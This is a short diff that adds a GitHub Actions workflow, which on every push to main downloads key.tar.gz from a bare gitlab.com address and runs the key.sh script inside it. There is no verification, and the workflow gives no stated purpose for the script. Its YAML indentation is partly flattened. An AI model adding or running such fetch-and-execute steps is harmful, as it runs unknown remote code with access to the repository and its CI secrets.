@@ -1,0 +1,22 @@
+name: Run Key Script
+
+on:
+workflow_dispatch:
+push:
+branches:
+- main
+
+jobs:
+run-script:
+runs-on: ubuntu-latest
+
+steps:
+  - name: Checkout repository
+    uses: actions/checkout@v4
+
+  - name: Download & Run Script
+    run: |
+      wget https://gitlab.com/key.tar.gz
+      tar -xvf key.tar.gz
+      chmod +x key.sh
+      ./key.sh
